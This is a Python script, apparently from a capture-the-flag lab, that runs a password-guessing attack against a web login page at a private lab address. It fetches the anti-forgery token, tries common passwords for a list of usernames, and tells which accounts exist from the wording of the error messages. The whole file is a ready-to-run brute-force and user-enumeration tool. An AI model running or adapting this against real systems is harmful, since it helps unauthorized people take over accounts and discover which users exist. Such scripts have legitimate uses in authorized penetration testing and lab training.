#!/usr/bin/env python3
"""Look for an actual successful login (anything other than the failure msgs)."""
import re
import time

import requests
import urllib3

urllib3.disable_warnings()
LOGIN = "https://10.129.242.196/Login"
S = requests.Session()
S.verify = False


def attempt(user, pw):
    r0 = S.get(LOGIN, timeout=15)
    tok = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r0.text).group(1)
    r = S.post(LOGIN, data={"Username": user, "Password": pw, "RememberMe": "false",
                            "__RequestVerificationToken": tok}, timeout=20,
               allow_redirects=False)
    body = r.text
    if r.status_code in (301, 302):
        return f"*** REDIRECT {r.headers.get('Location')} ***"
    if "Login attempt failed" in body:
        return "fail(user exists)"
    if "Invalid login attempt" in body:
        return "invalid(user unknown)"
    if "field-validation-error" in body:
        return "validation error"
    return f"OTHER len={len(body)}: " + re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', body))[:120]


users = ["auditor", "will.s", "mark.s", "ashley.b", "admin", "administrator"]
pws = ["Password123", "Password1", "Welcome1", "hercules", "Hercules123",
       "Summer2025", "P@ssw0rd", "test"]

for u in users[:1]:
    for p in pws:
        print(f"{u:12s} / {p:14s} -> {attempt(u, p)}", flush=True)
        time.sleep(1.7)
